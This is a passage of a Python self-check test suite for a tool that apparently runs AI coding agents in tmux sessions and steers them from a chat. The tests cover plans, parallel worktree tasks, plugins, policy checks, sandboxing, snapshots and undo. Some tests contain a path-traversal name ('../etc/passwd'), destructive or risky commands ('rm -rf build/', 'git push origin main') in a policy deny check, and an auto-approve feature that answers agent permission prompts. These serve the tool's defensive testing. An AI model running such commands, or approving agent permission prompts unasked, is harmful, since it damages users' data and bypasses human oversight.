        # plan: one big task -> the agent's own breakdown, run like !shift.
        # Still inside topic 9's "box" window above, before it is put back below.
        assert parse_plan("1. first step\n2. second step\n") == ["first step", "second step"]
        assert parse_plan("Sure, here:\n- do a\n* do b\nthanks") == ["do a", "do b"]
        assert parse_plan("no list here") == []
        _plan.clear()
        pstate, pprompts = {}, []
    with stubbed(send=lambda c, t, x, mode="mono", buttons=None, quiet=False: csent.append(x),
                 send_prompt=lambda c, st, t, se, tx, mid=None: pprompts.append((se, tx))):
        assert "no live session" in plan_start(cfg2, pstate, "404", "do the thing")
        out = plan_start(cfg2, pstate, "9", "ship the feature")
        assert "asking" in out, out
        assert pprompts[-1][0] == "box" and "ship the feature" in pprompts[-1][1]
        assert "already out" in plan_start(cfg2, pstate, "9", "again")
        assert plan_capture(cfg2, pstate, "9", "somebody-else", "1. x") is False
        assert plan_capture(cfg2, pstate, "9", "box",
                             "Sure:\n1. write the tests\n2. wire it up\n") is True
        assert "9" not in _plan
        assert pstate["box"]["shift"] == ["write the tests", "wire it up"]
        assert pstate["box"]["shift_total"] == 2
        assert any("plan set: 2 step" in x for x in csent), csent
        # a reply with no numbered list is reported, not silently dropped
        plan_start(cfg2, pstate, "9", "another one")
        csent.clear()
        assert plan_capture(cfg2, pstate, "9", "box", "sure, working on it") is True
        assert any("no numbered list" in x for x in csent), csent
        # !relay: another agent on the bench plans, this topic's agent builds
        with stubbed(pair_reviewer=lambda c, t, k: ("box-codex", "started codex"),
                     bench_of=lambda c, t: {"claude": "box"}):
            assert "usage" in relay_cmd(cfg2, pstate, threading.Lock(), "9", "box", "nobody do it")
            out = relay_cmd(cfg2, pstate, threading.Lock(), "9", "box", "codex add CSV export")
            assert "codex plans → claude builds" in out and "started codex" in out, out
            assert pprompts[-1][0] == "box-codex" and "add CSV export" in pprompts[-1][1]
            assert plan_capture(cfg2, pstate, "9", "box-codex", "1. a\n2. b") is True
            assert pstate["box"]["shift"] == ["a", "b"] and "box-codex" not in pstate, pstate
            assert "plan from box-codex → box: 2 step" in csent[-1], csent[-1]
        # !fan: parallel tasks, each a worktree + topic + agent + check, after "go"
        assert parse_fan("Sure:\n1. @codex add tests || pytest -q\n2. @nobody x\n3. doc it",
                         {"codex"}) == [("codex", "add tests", "pytest -q"),
                                        (None, "@nobody x", None), (None, "doc it", None)]
        assert "usage" in fan_cmd(cfg2, pstate, threading.Lock(), "9", "")
        assert "nothing waiting" in fan_cmd(cfg2, pstate, threading.Lock(), "9", "go")
        assert "asking" in fan_cmd(cfg2, pstate, threading.Lock(), "9", "ship v2")
        assert "INDEPENDENT" in pprompts[-1][1] and _plan["9"]["fan"]
        csent.clear()
        assert plan_capture(cfg2, pstate, "9", "box", "1. @codex add tests || true\n2. docs") is True
        assert "2 parallel task" in csent[-1] and "9" in _fan and "9" not in _plan, csent
        import tempfile as tf_
        with tf_.TemporaryDirectory() as fr_:
            fr_ = os.path.realpath(fr_)
            repo_ = os.path.join(fr_, "app")
            run("git", "init", "-q", repo_)
            run("git", "-C", repo_, "-c", "user.name=t", "-c", "user.email=t@t",
                "commit", "-q", "--allow-empty", "-m", "init")
            fcfg_, fgoals_, fnew_ = dict(cfg2, dirs={"9": repo_}), [], []

            def fake_new(c, st, lk, title, name, folder, key, idea="", server=""):
                fnew_.append((name, folder, key))
                return True, "ok", str(300 + len(fnew_))
            with stubbed(topic_new=fake_new, save_queue=lambda s: None,
                         goal_cmd=lambda c, lk, t, a: fgoals_.append((t, a))):
                out = fan_go(fcfg_, pstate, threading.Lock(), "9")
            assert out.count("✅") == 2 and "9" not in _fan, out
            assert [n for n, _, _ in fnew_] == ["add-tests", "docs"] and fnew_[0][2] == "codex"
            assert all(os.path.isdir(f) for _, f, _ in fnew_) and fgoals_ == [("301", "true")]
            assert "do not merge" in pstate["add-tests"]["queue"][0]
            assert "fan/docs" in run("git", "-C", repo_, "branch")
            assert fcfg_["fan_kids"] == {"301": "9", "302": "9"}
            assert fnew_[0][0] == "add-tests" and "no fan topics" in fan_clean(fcfg_, pstate, threading.Lock(), "5")
            with stubbed(topic_close=lambda c, st, lk, t: (True, "closed"), save_cfg=lambda c: None):
                out = fan_clean(fcfg_, pstate, threading.Lock(), "9")
            assert out.count("✅ closed") == 2 and not fcfg_["fan_kids"], out
        csent.clear()
        fan_cmd(cfg2, pstate, threading.Lock(), "9", "again")
        assert "fan cancelled" == fan_cmd(cfg2, pstate, threading.Lock(), "9", "cancel")
    # plugins: a name is a filesystem path, so it is restricted before it
    # becomes one, and only ever run — never typed into a session. Still
    # inside topic 9's "box" window above, before it is put back below.
    assert run_plugin("/tmp", "../etc/passwd", "") is None       # not a bare name
    assert run_plugin("/tmp", "no-such-plugin", "") is None      # nothing there
    import tempfile
    plugdir = tempfile.mkdtemp(prefix="nightmux-selfcheck-plugins-")
    with open(os.path.join(plugdir, "echoarg"), "w") as f:
        f.write("#!/bin/sh\necho \"got: $1\"\n")
    os.chmod(os.path.join(plugdir, "echoarg"), 0o755)
    with open(os.path.join(plugdir, "notexec"), "w") as f:
        f.write("#!/bin/sh\necho nope\n")               # left without +x: must not run
    with stubbed(PLUGIN_DIR=plugdir):
        assert run_plugin("/tmp", "echoarg", "hello") == "got: hello"
        assert run_plugin("/tmp", "notexec", "") is None
        assert "echoarg" in handle(cfg2, {}, lk, "9", "!plugins")
        # sess_cwd is globally faked to a nonexistent path from the daemon-
        # restart tests onward (see "/nonexistent-nightmux-selfcheck" above) —
        # give handle() a real cwd here so this checks the plugin wiring, not
        # subprocess's own cwd validation.
        with stubbed(sess_cwd=lambda s: "/tmp"):
            assert handle(cfg2, {}, lk, "9", "!echoarg hello there") == "got: hello there"
            # a name with no matching plugin still falls through to typing it in
            with stubbed(send_prompt=lambda c, st, t, se, tx, mid=None: "typed:" + tx):
                assert handle(cfg2, {}, lk, "9", "!not-a-plugin hi") == "typed:!not-a-plugin hi"
                assert "did you mean !budget" in handle(cfg2, {}, lk, "9", "!budjet 5M")
                assert "!saved" in handle(cfg2, {}, lk, "9", "!savings")
    shutil.rmtree(plugdir, ignore_errors=True)
    with stubbed(PLUGIN_DIR="/no/such/dir"):
        assert "no plugins in" in handle(cfg2, {}, lk, "9", "!plugins")

    _plan.clear(), _consult.clear()
    cfg2["topics"]["9"], cfg2["started"]["9"], cfg2["bench"]["9"] = was9

    # The watcher has to read every agent a topic can be written to, or a
    # benched one takes prompts and its answers go nowhere.
    wcfg = {"topics": {"5": "a", "6": "b"},
            "bench": {"5": {"claude": "a", "agy": "a-agy"}},
            "started": {"5": "claude", "6": "claude"}}
    assert watched(wcfg) == [("5", "a"), ("5", "a-agy"), ("6", "b")], watched(wcfg)
    assert len(watched(wcfg)) == len(set(watched(wcfg))), "a session watched twice"

    # auto-yes: opt-in per topic and agent, only ever the affirmative option,
    # and it gives up rather than looping.
    ycfg = {"topics": {"7": "ay"}, "bench": {"7": {"agy": "ay", "claude": "ay-c"}},
            "started": {"7": "agy"}, "chat_id": -1, "autoyes": {"7": ["agy"]}}
    assert agent_key(ycfg, "7", "ay") == "agy" and agent_key(ycfg, "7", "no") is None
    menu = ["Do you want to proceed?", "❯ 1. Yes", "  2. No"]
    ysent, ypress = [], []
    yst = {"ay": {"mode": "waiting"}}
    with stubbed(visible=lambda x: menu, press=lambda s_, k_, confirm=False: ypress.append(k_),
                 pick=lambda s_, w_: None, remember=lambda *a: None,
                 send=lambda c, t, x, mode="mono", buttons=None, quiet=False: ysent.append(x)):
        autoyes(ycfg, yst, "7", "ay")
        assert ypress == ["1"] and ysent[-1].startswith("🤖 auto-yes ay → 1"), (ypress, ysent)
        autoyes(ycfg, yst, "7", "ay")
        assert ypress == ["1"], "answered the same screen twice inside the gap"
        # an agent the topic did not opt in for is never touched
        yst["ay-c"] = {"mode": "waiting"}
        autoyes(ycfg, yst, "7", "ay-c")
        assert ypress == ["1"], "answered an agent that was not opted in"
        # a menu with no recognisable yes is left for a human
        yst["ay"].update(mode="waiting", autoyes_at=0)
        with stubbed(visible=lambda x: ["Pick a model", "❯ 1. Opus", "  2. Sonnet"]):
            autoyes(ycfg, yst, "7", "ay")
        assert ypress == ["1"], "pressed something that was not a yes"
        # ...and it stops rather than looping all night
        yst["ay"].update(mode="waiting", autoyes_at=0,
                         autoyes_hits=[time.time()] * AUTOYES_MAX)
        n_ = len(ysent)
        autoyes(ycfg, yst, "7", "ay")
        assert ypress == ["1"] and "auto-yes stopped" in ysent[-1], ysent[-1]
        autoyes(ycfg, yst, "7", "ay")
        assert len(ysent) == n_ + 1, "said it was capped more than once"
        # Allow / Approve / bracketed options are recognized as affirmative
        yst["ay"].update(mode="waiting", autoyes_at=0, autoyes_hits=[])
        with stubbed(visible=lambda x: ["Requesting permission:", "> 1. Allow once", "  2. Deny"]):
            autoyes(ycfg, yst, "7", "ay")
        assert ypress[-1] == "1" and "auto-yes ay → 1" in ysent[-1]
        yst["ay"].update(mode="waiting", autoyes_at=0)
        with stubbed(visible=lambda x: ["Run this command?", "> [1] Approve", "  [2] Reject"]):
            autoyes(ycfg, yst, "7", "ay")
        assert ypress[-1] == "1" and "auto-yes ay → 1" in ysent[-1]
        # A topic that opted in for agy, bound to a session nightmux started as
        # Claude: not an agy pane because Claude is the default agent. It typed
        # 2 into Claude's prompt every few seconds, up to the hourly cap.
        n_ = len(ypress)
        yst["cl"] = {"mode": "waiting"}
        autoyes(dict(ycfg, topics={"7": "cl"}, bench={}, started={"7": "claude"}), yst, "7", "cl")
        assert len(ypress) == n_, "answered a Claude pane for an agy opt-in"
        yst["un"] = {"mode": "waiting"}         # one nothing is known about still does
        autoyes(dict(ycfg, topics={"7": "un"}, bench={}, started={}), yst, "7", "un")
        assert len(ypress) == n_ + 1, "the single-agent fallback stopped answering"
    assert "auto-yes on for: agy" in handle(ycfg, yst, lk, "7", "!autoyes on")
    assert "usage" in template_cmd({}, {}, None, "1", "") and "what?" in template_cmd({}, {}, None, "1", "api")
    assert all("{what}" in v for v in TEMPLATES.values())
    _vc = {}
    assert "on" in voice_cmd(_vc, threading.Lock(), 7, "on") and _vc["voice"] == ["7"]
    assert "off" in voice_cmd(_vc, threading.Lock(), 7, "off") and _vc["voice"] == []
    assert "usage" in voice_cmd(_vc, threading.Lock(), 7, "x")
    _nb = ntfy_body("t1", "needs_input", "proj", "ok?")
    assert _nb["topic"] == "t1" and _nb["priority"] == 4 and _nb["title"] == "proj: needs input"
    _nc = {}
    assert "subscribe to 'abc'" in events_cmd(_nc, 7, "s", "ntfy abc") and _nc["events_ntfy"] == "abc"
    assert "usage" in events_cmd(_nc, 7, "s", "ntfy bad!topic")
    events_cmd(_nc, 7, "s", "off")
    assert "events_ntfy" not in _nc
    _led = {"proj": {str(int(time.time() // 3600)): 500, str(int(time.time() // 3600) - 1): 250}, "old": {"1": 9}}
    _rows, _days = spend_top(_led, 7)
    assert _rows == [("proj", 750)] and sum(_days.values()) == 750, (_rows, _days)
    assert "proj" in spend_top_report(_led, 7) and "no spend" in spend_top_report({}, 7)
    assert policy_hit({}, 7, "Run: rm -rf build/") and policy_hit({}, 7, "git push origin main")
    assert not policy_hit({}, 7, "Run: ls -la")
    assert policy_hit({"policy": {"7": {"off": True, "deny": ["deploy"]}}}, 7, "deploy now") == "deploy"
    assert not policy_hit({"policy": {"7": {"off": True}}}, 7, "sudo ls")
    assert "usage" in policy_cmd({"chat_id": -1}, threading.Lock(), 7, "bogus")
    assert not (cfg2.get("autoyes") or {}), "autoyes must never be on by default"

    assert bound_to(cfg2, "box", "9") is None
    cfg2["topics"]["94"] = "box"
    assert bound_to(cfg2, "box", "9") == "94"
    cfg2["bench"]["9"]["aider"] = "box"           # a bench entry another topic owns
    assert "topic 94's session" in handle(cfg2, {}, lk, "9", "!aider")
    del cfg2["bench"]["9"]["aider"]
    with stubbed(real_session=lambda a: "box"):
        assert "one session, one topic" in handle(cfg2, {}, lk, "95", "!bind box")
    assert "95" not in cfg2["topics"], cfg2["topics"]
    cfg2["topics"].pop("94")
    globals()["has_session"] = lambda s: False

    # restore_startup: a dead topic gets a button unless auto_restore says relaunch.
    cfg3 = {"topics": {"1": "gone1", "2": "alive2"}, "dirs": {"1": "/tmp"}, "chat_id": -1}
    st3, n = {}, len(sent)
    globals()["has_session"] = lambda s: s == "alive2"
    restore_startup(cfg3, st3, lk)
    assert sent[-1].startswith("⚠️ gone1 is gone") and len(sent) == n + 1, sent[n:]
    assert st3["gone1"]["dead"] is True                # pre-armed: watchdog stays quiet
    cfg3["auto_restore"] = True
    restore_startup(cfg3, st3, lk)
    assert spawned[-1][0] == "gone1" and sent[-1].startswith("▶️ restored gone1"), sent[-1]
    cfg3["topics"]["3"] = "gone3"                 # never recorded a directory
    restore_startup(cfg3, st3, lk)
    assert "not restored" in sent[-1], sent[-1]   # said so, rather than "restored"

    # git worktrees + snapshot-before-unattended-prompt, against a real throwaway repo.
    import tempfile
    repo = tempfile.mkdtemp(prefix="nightmux-selfcheck-")
    subprocess.run(["git", "init", "-q", repo], check=True)
    subprocess.run(["git", "-C", repo, "config", "user.email", "t@t"], check=True)
    subprocess.run(["git", "-C", repo, "config", "user.name", "t"], check=True)
    with open(os.path.join(repo, "f"), "w") as f:
        f.write("one")
    subprocess.run(["git", "-C", repo, "add", "f"], check=True)
    subprocess.run(["git", "-C", repo, "commit", "-q", "-m", "init"], check=True)

    assert worktree_path("/no/such/dir", "x") is None    # not a repo: nothing to attach to
    wt = worktree_path(repo, "feature-a")
    assert wt == os.path.join(f"{repo}-wt", "feature-a") and os.path.isdir(wt), wt
    assert tmux_git(repo, "rev-parse", "--verify", "--quiet", "refs/heads/feature-a")
    assert worktree_path(repo, "feature-a") == wt        # already there: reused, not redone

    # sandbox_cmd: shape of the docker line, mounts only what exists, off by default
    sbc_ = {"sandbox": {"names": ["box"], "mounts": ["~/.claude", "/no/such/thing"], "network": "none", "image": "img"}}
    assert sandboxed(sbc_, "box") and not sandboxed(sbc_, "other") and sandboxed({"sandbox": {"all": 1}}, "x")
    line_ = sandbox_cmd(sbc_, "bo.x", repo, "claude --foo", tty=False)
    assert line_.startswith("docker run --rm --name nm-bo.x -u ") and "--cap-drop ALL" in line_, line_
    assert "--network none" in line_ and "no/such" not in line_ and line_.endswith("img sh -c 'claude --foo'"), line_
    assert f"-v {repo}:{repo} -w {repo}" in line_ and "-it" not in line_.split(), line_
    assert "docker run --rm -it " in sandbox_cmd(sbc_, "b", repo, "x") or "-it" in sandbox_cmd(sbc_, "b", repo, "x")
    # the board: page served, !board without and with office_url
    assert "/api/topics" in BOARD_HTML and "'needs'" in BOARD_HTML
    sent_b = []
    with stubbed(send=lambda *a, **k: sent_b.append((a, k))):
        assert "kanban needs office_url" in handle(dict(cfg2, office_url=None), {}, lk, "9", "!kanban")
        assert handle(dict(cfg2, office_url="https://b.ts.net:9090/office"), {}, lk, "9", "!kanban") is None
        assert "https://b.ts.net:9090/board" in sent_b[-1][1]["buttons"], sent_b
    # !review / review_data: a changed file, an untracked one, a clean repo
    with open(os.path.join(repo, "f"), "w") as f:
        f.write("two\n")
    with open(os.path.join(repo, "new.txt"), "w") as f:
        f.write("x")
    with stubbed(sess_cwd=lambda s: repo, has_session=lambda s: True, real_session=lambda s: s):
        rd_ = review_data({"topics": {"9": "revs"}}, {}, "9")
        assert [(f["path"], f["add"], f["del"]) for f in rd_["files"]] == [("f", 1, 1)], rd_
        assert rd_["untracked"] == ["new.txt"] and rd_["session"] == "revs" and rd_["pr"] is None, rd_
        assert "+two" in rd_["files"][0]["diff"] and "-one" in rd_["files"][0]["diff"], rd_
        assert review_data({"topics": {}}, {}, "9")["error"] == "topic not bound"
        sent_ = []
        with stubbed(send=lambda *a, **k: sent_.append((a, k))):
            c9_ = dict(cfg2, topics={"9": "revs"}, office_url=None)
            txt_ = handle(c9_, {}, lk, "9", "!review")
            assert "1 files +1 −1" in txt_ and "f  +1 −1" in txt_ and "new untracked" in txt_, txt_
            assert handle(dict(c9_, office_url="https://b.ts.net:9090/office"), {}, lk, "9", "!review") is None
            assert "https://b.ts.net:9090/review/9" in sent_[-1][1]["buttons"], sent_
    subprocess.run(["git", "-C", repo, "checkout", "-q", "--", "f"], check=True)
    os.remove(os.path.join(repo, "new.txt"))

    globals()["has_session"] = lambda s: False
    # No dir: a folder of its own under projects_root, never loose in $HOME.
    with tempfile.TemporaryDirectory() as pr_:
        nodir_ = {"topics": {}, "projects_root": pr_}
        with stubbed(spawn=lambda *a: None, has_session=lambda n: False,
                     save_cfg=lambda c: None):
            start_session(nodir_, {}, lk, "95", "fresh", "claude")
            assert nodir_["dirs"]["95"] == os.path.join(pr_, "fresh"), nodir_
    out = start_session(cfg2, {}, lk, "92", f"wtses {repo} @feature-b", "claude")
    assert out.startswith("started claude") and "@feature-b" in out, out
    assert cfg2["dirs"]["92"] == os.path.join(f"{repo}-wt", "feature-b")
    assert os.path.isdir(cfg2["dirs"]["92"])
    plaindir = tempfile.mkdtemp(prefix="nightmux-selfcheck-plain-")
    bad = start_session(cfg2, {}, lk, "93", f"wtses2 {plaindir} @x", "claude")
    assert "not a git repo" in bad, bad
    shutil.rmtree(plaindir, ignore_errors=True)

    with open(os.path.join(repo, "f"), "w") as f:        # dirty worktree
        f.write("two")
    with stubbed(sess_cwd=lambda s: repo):
        snapshot_repo("t")                                # unattended: snapshot first
    with open(os.path.join(repo, "f")) as f:
        assert f.read() == "two", "stash create must never touch the worktree"
    pre = [n_ for n_ in tmux_git(repo, "for-each-ref", "--format=%(refname:short)",
                                 "refs/heads/nightmux/pre-*").split("\n") if n_.strip()]
    assert len(pre) == 1, pre
    tmux_git(repo, "branch", "-D", pre[0])   # clean slate for the deterministic prune below

    for i in range(SNAP_KEEP + 2):                                    # deterministic creatordate
        d = f"2020-01-01T00:00:{i:02d}"
        env = dict(os.environ, GIT_AUTHOR_DATE=d, GIT_COMMITTER_DATE=d)
        with open(os.path.join(repo, "f"), "w") as f:
            f.write(str(i))
        subprocess.run(["git", "-C", repo, "commit", "-aq", "-m", str(i)], env=env, check=True)
        subprocess.run(["git", "-C", repo, "branch", f"nightmux/pre-fake{i}", "HEAD"],
                       env=env, check=True)
    prune_snapshots(repo)
    survivors = [n_ for n_ in tmux_git(
        repo, "for-each-ref", "--sort=-creatordate", "--format=%(refname:short)",
        "refs/heads/nightmux/pre-*").split("\n") if n_.strip()]
    assert len(survivors) == SNAP_KEEP, survivors      # only the newest SNAP_KEEP survive
    assert survivors[0] == f"nightmux/pre-fake{SNAP_KEEP + 1}", survivors
    assert "nightmux/pre-fake0" not in survivors, survivors

    cfg4 = {"topics": {"1": "s4"}}
    with stubbed(sess_cwd=lambda s: repo, has_session=lambda s: True):
        undo_out = handle(cfg4, {}, threading.Lock(), "1", "!undo")
        wt_out = handle(cfg4, {}, threading.Lock(), "1", "!worktrees")
    assert f"nightmux/pre-fake{SNAP_KEEP + 1}" in undo_out, undo_out
    assert "1. 01-01 00:00  same as now" in undo_out, undo_out
    assert f"git diff nightmux/pre-fake{SNAP_KEEP + 1}" in undo_out, undo_out
    with open(os.path.join(repo, "f"), "w") as f:      # the agent wrecks the file
        f.write("wrecked")
    with stubbed(sess_cwd=lambda s: repo, has_session=lambda s: True,
                 visible=lambda s: ["❯ "]):
        undo_out = handle(cfg4, {}, threading.Lock(), "1", "!undo 2")
        assert f"back to nightmux/pre-fake{SNAP_KEEP}" in undo_out, undo_out
        with open(os.path.join(repo, "f")) as f:
            assert f.read() == str(SNAP_KEEP)
        handle(cfg4, {}, threading.Lock(), "1", "!undo 1")   # undo the undo
        with open(os.path.join(repo, "f")) as f:
            assert f.read() == "wrecked"
    with stubbed(sess_cwd=lambda s: repo, has_session=lambda s: True,
                 visible=lambda s: ["esc to interrupt"]):
        assert "is working" in handle(cfg4, {}, threading.Lock(), "1", "!undo 1")
    assert repo in wt_out and "feature-a" in wt_out, wt_out

    shutil.rmtree(repo, ignore_errors=True)
    shutil.rmtree(f"{repo}-wt", ignore_errors=True)

    # --doctor: one ✓/✗ line per check, and the overall result is their AND.
    def _boom():
        raise OSError("no config")

    class _FakeShutil:
        which = staticmethod(lambda n: "/usr/bin/tmux")

    with stubbed(load_cfg=_boom):
        assert doctor() is False               # no config at all: nothing else to check
    with stubbed(load_cfg=lambda: {"token": "t", "chat_id": 1, "allow_users": [1]}, reader_drift=lambda: [],
                api=lambda c, m, **kw: {"ok": True}, wired=lambda: ["stop"],
                run=lambda *a, **kw: "process" if "KillMode" in a else "active",
                shutil=_FakeShutil(), installed_agents=lambda c: ["claude"]):
        assert doctor() is True                # every check stubbed healthy
    with stubbed(load_cfg=lambda: {"token": "t", "chat_id": 1, "allow_users": [1]},
                api=lambda c, m, **kw: {"ok": False, "description": "bad token"},
                wired=lambda: [], run=lambda *a, **kw: "inactive", shutil=_FakeShutil()):
        assert doctor() is False               # one ✗ (token rejected) fails the whole thing

    # watcher()'s per-session tick runs through a pool now (see watch_one) so
    # that one laggy tmux round-trip cannot stall every other session's update
    # behind it. Prove the overlap directly: stub watchdog() to sleep for one
    # session and return at once for the other, submit the slow one FIRST — a
    # regressed-to-serial loop would finish it, and only then start the fast
    # one — and check the fast one still lands almost immediately.
    order, marks = [], {}

    def _slow_watchdog(cfg, state, topic, sess, alive):
        if sess == "slow":
            time.sleep(0.3)
        marks[sess] = time.time()
        order.append(sess)
        return False   # skip watch_one's body; only the overlap matters here

    with stubbed(watchdog=_slow_watchdog):
        conc_state, conc_lock, t0 = {}, threading.Lock(), time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool:
            futs = [pool.submit(watch_one, {}, conc_state, conc_lock, "1", s, {})
                    for s in ("slow", "fast")]   # slow submitted first, on purpose
            for fut in concurrent.futures.as_completed(futs):
                fut.result()
    assert order == ["fast", "slow"], order          # fast finished first despite going in second
    assert marks["fast"] - t0 < 0.15, marks           # not stuck queued behind slow's 0.3s

    for n_ in os.listdir(STATE_DIR):
        os.remove(os.path.join(STATE_DIR, n_))
    os.rmdir(STATE_DIR)
    # Later saves recreate the redirected config; leaving it behind drops test
    # debris in the live upload cache, where prune would not touch it for a week.
    os.path.exists(CFG_PATH) and os.remove(CFG_PATH)
    # A non-snapshot JSON in the shared state dir (a list, from another tool)
    # once crash-looped the daemon at startup inside snapped().
    with tempfile.TemporaryDirectory() as sd_, stubbed(STATE_DIR=sd_):
        with open(os.path.join(sd_, "stray.json"), "w") as f:
            json.dump(["x"], f)
        with open(os.path.join(sd_, "s1.json"), "w") as f:
            json.dump({"pane": "%9", "ts": time.time()}, f)
        assert list(snapped()) == ["%9"] and list(snapped()) == ["%9"]
    # !companion: seeds a private folder once, gives the agent the nightmux tools,
    # and the tools send only where a !budget caps the spend.
    with tempfile.TemporaryDirectory() as cd_:
        ran, cd_ = [], os.path.join(cd_, "comp")
        fake_sp = type("SP", (), {"TimeoutExpired": subprocess.TimeoutExpired, "DEVNULL": None,
                                  "run": staticmethod(lambda a, **k: ran.append(a) or
                                                      type("P", (), {"returncode": 0})())})
        st_ = {}
        with stubbed(COMPANION_DIR=cd_, subprocess=fake_sp,
                     start_session=lambda c, s, l, t, a, k: f"started {k} '{a.split()[0]}'"):
            cfgc_ = {"agents": {}}
            out = companion_cmd(cfgc_, st_, threading.Lock(), "7", "claude")
            assert cfgc_["memory"]["7"] == "off"         # no project-notes turns for it
            assert out.startswith("started claude 'companion'"), out
            assert ran[-1][:4] == ["claude", "mcp", "add", "-s"] and ran[-1][-2:] == ["--mcp", "--companion"]
            with open(os.path.join(cd_, "CLAUDE.md")) as f:
                assert "@PERSONA.md" in f.read()       # persona survives compaction
            assert oct(os.stat(cd_).st_mode & 0o777) == "0o700"
            with open(os.path.join(cd_, "PERSONA.md"), "w") as f:
                f.write("mine")
            companion_cmd({"agents": {}}, {}, threading.Lock(), "7", "")
            with open(os.path.join(cd_, "PERSONA.md")) as f:
                assert f.read() == "mine"            # never overwrites the owner's edits
            assert "usage" in companion_cmd({"agents": {}}, {}, threading.Lock(), "7", "nope")
            # night: 2h rounds from the night time to the morning, then the summary;
            # off drops only the companion's jobs.
            cfgn = {"companion": {"topic": "7", "session": "companion"}, "tz_offset": 0}
            stn = {"companion": {"sched": [{"at": 1, "every": 60, "text": "mine"}]}}
            with stubbed(save_queue=lambda s: None):
                out = companion_night(cfgn, stn, "night 01:00 07:30")
                jobs = stn["companion"]["sched"]
                assert [time.strftime("%H:%M", time.gmtime(j["at"])) for j in jobs[1:]] == \
                    ["01:00", "03:00", "05:00", "07:30"], out
                assert jobs[-1]["text"] == COMPANION_MORNING and jobs[0]["text"] == "mine"
                companion_night(cfgn, stn, "night off")
                assert stn["companion"]["sched"] == [{"at": 1, "every": 60, "text": "mine"}]
                assert "start the companion" in companion_night({}, {}, "night")
            cfg_ = {"budgets": {"5": {"tokens": 1000, "per": "day"}}}
            for t_ in ("6", ""):
                try:
                    companion_prompt(cfg_, t_, "x")
                    assert False, "sent without a budget"
                except ValueError as e:
                    assert "!budget" in str(e)
            assert companion_prompt(cfg_, "6", "x", companion=False) == "x"
            cfg_["companion"] = {"topic": "5"}
            try:
                companion_prompt(cfg_, "5", "x")
                assert False, "sent to itself"
            except ValueError as e:
                assert "own topic" in str(e)
            cfg_.pop("companion")
            # read_chat in companion mode: only unseen messages, at most 15, clipped.
            got = []
            msgs = [{"id": i, "who": "agent", "text": "y" * 3000} for i in range(1, 21)]

            def fake_open(url, timeout=10):
                got.append(url)
                after = int(url.rsplit("after=", 1)[1])
                return io.BytesIO(json.dumps({"items": [m for m in msgs if m["id"] > after]}).encode())
            fake_ul = type("U", (), {"parse": urllib.parse, "request": type("R", (), {
                "urlopen": staticmethod(fake_open), "Request": urllib.request.Request})})
            def fake_open2(url, timeout=10):
                got.append(getattr(url, "full_url", url))
                return io.BytesIO(json.dumps([{"topic": "5", "mode": "waiting"}]).encode())
            fake_ul2 = type("U", (), {"parse": urllib.parse, "request": type("R", (), {
                "urlopen": staticmethod(fake_open2), "Request": urllib.request.Request})})
            with stubbed(urllib=fake_ul2):
                try:
                    nm_call("send_prompt", {"topic": "5", "text": "yes"}, "http://x")
                    assert False, "typed into an open menu"
                except ValueError as e:
                    assert "menu is open" in str(e) and not any("/topic/" in u for u in got)
            with stubbed(urllib=fake_ul):
                _nm_seen.clear()
                text = nm_call("read_chat", {"topic": "5"}, base="http://x", companion=True)[0]["text"]
                assert text.count("agent:") == 15 and "#20 " in text and len(text) < 15 * 1600
                assert nm_call("read_chat", {"topic": "5"}, "http://x", True)[0]["text"] == "nothing new"
                assert got[-1].endswith("after=20")
                assert nm_call("read_chat", {"topic": "5"}, "http://x")[0]["text"].count("agent:") == 20
            with stubbed(budget_used=lambda c, t, s: 1_200_000):
                assert budget_line({"budgets": {"5": {"tokens": 5_000_000, "per": "day"}}}, "5") \
                    == f"{_k(1_200_000)} of {_k(5_000_000)} this day"
                assert budget_line({}, "5") is None
            # progress: moved projects with flags, quiet ones on one line, never itself.
            now_ = time.time()
            rows_ = [{"topic": "5", "session": "shop", "mode": "idle", "budget": "1M of 5M this day"},
                     {"topic": "6", "session": "blog", "mode": "waiting"},
                     {"topic": "8", "session": "old", "mode": "idle"},
                     {"topic": "9", "session": "comp", "mode": "idle"}]
            chat_ = {"5": [{"id": i, "t": now_, "who": "bot", "text": f"✅ shop\nstep {i}\nmore"} for i in range(1, 8)]
                     + [{"id": 20 + i, "t": now_, "who": "bot", "text": f"🧠 memory {i}"} for i in range(9)],
                     "9": [{"id": 50, "t": now_, "who": "bot", "text": "me"}]}
            stp = {"blog": {"asked": "Use postgres or sqlite?"}}
            with stubbed(topics_status=lambda c, s: rows_, _chat=chat_, tmux_git=lambda *a: ""):
                cfgp = {"companion": {"topic": "9"}, "dirs": {"5": cd_}}
                rep_ = progress_report(cfgp, stp, now_ - 60)
                assert "▸ shop (topic 5) [idle] · 7 replies · 0 commits · budget 1M of 5M" in rep_, rep_
                # status lines are not replies: nine 🧠 lines alone are no circle
                chat_["5"] = chat_["5"][7:]
                rep2 = progress_report(cfgp, stp, now_ - 60)
                assert "0 replies" in rep2 and "circles" not in rep2 and "last:" not in rep2, rep2
                chat_["5"] = [{"id": i, "t": now_, "who": "bot", "text": f"✅ shop\nstep {i}\nmore"}
                              for i in range(1, 8)]
                assert "last: step 7" in rep_ and "going in circles" in rep_
                assert "✋ waiting on you: Use postgres or sqlite?" in rep_ and "quiet: old" in rep_
                assert "comp" not in rep_
                # a question at the end of an answer, unanswered: flagged with its wait
                chat_["8"] = [{"id": 30, "t": now_ - 7200, "who": "bot",
                               "text": "✅ old\nDone.\nShould I also add dark mode?"}]
                assert "✋ waiting on you: Should I also add dark mode? (2h" in \
                    progress_report(cfgp, stp, now_ - 60)
                chat_["8"].append({"id": 31, "t": now_ - 3600, "who": "you", "text": "no"})
                assert "quiet: old" in progress_report(cfgp, stp, now_ - 60)
                chat_.pop("8")
            # commits made in the terminal show even with no chat (empty after a restart)
            with stubbed(topics_status=lambda c, s: rows_[2:3], _chat=chat_,
                         tmux_git=lambda cwd, *a: "true" if a[0] == "rev-parse" else "abc123 fix login\n"):
                rep3 = progress_report({"dirs": {"8": cd_}}, {}, now_ - 60)
                assert "▸ old (topic 8) [idle] · 0 replies · 1 commits" in rep3, rep3
            # !companion focus, said in the project's topic: reports carry only targeted
            # projects, idle ones too, so a quiet night still has work toward the target.
            lk_ = threading.Lock()
            cff = {"topics": {"5": "shop", "6": "blog", "9": "companion"},
                   "companion": {"topic": "9", "session": "companion"}}
            with stubbed(save_cfg=lambda c: None, save_queue=lambda s: None):
                assert "start the companion" in companion_focus({}, lk_, "5", "focus x")
                out = companion_focus(cff, lk_, 5, "focus ship checkout v2")
                assert "suggest until" in out and cff["companion"]["focus"] == {"5": "ship checkout v2"}
